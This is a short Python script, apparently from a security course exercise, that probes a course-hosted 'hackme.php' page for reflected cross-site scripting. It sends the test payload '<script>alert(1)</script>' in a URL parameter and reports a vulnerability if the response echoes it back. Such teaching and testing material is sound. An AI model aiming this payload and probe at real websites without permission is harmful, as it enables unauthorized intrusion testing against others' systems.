# import urllib request urlopen function which perform HTTP get requests
from urllib.request import urlopen

# set host and payload
host = 'http://www.cs.tufts.edu/comp/120/hackme.php?token='
payload = "<script>alert(1)</script>"

# storing response of HTTP get request with payload set to token
req = urlopen('http://www.cs.tufts.edu/comp/120/hackme.php?token=' + payload)

# Alert user of vulnerability if payload is in response
if payload in str(req.read()):
	print("Cross-Site Scripting vulnerability found!")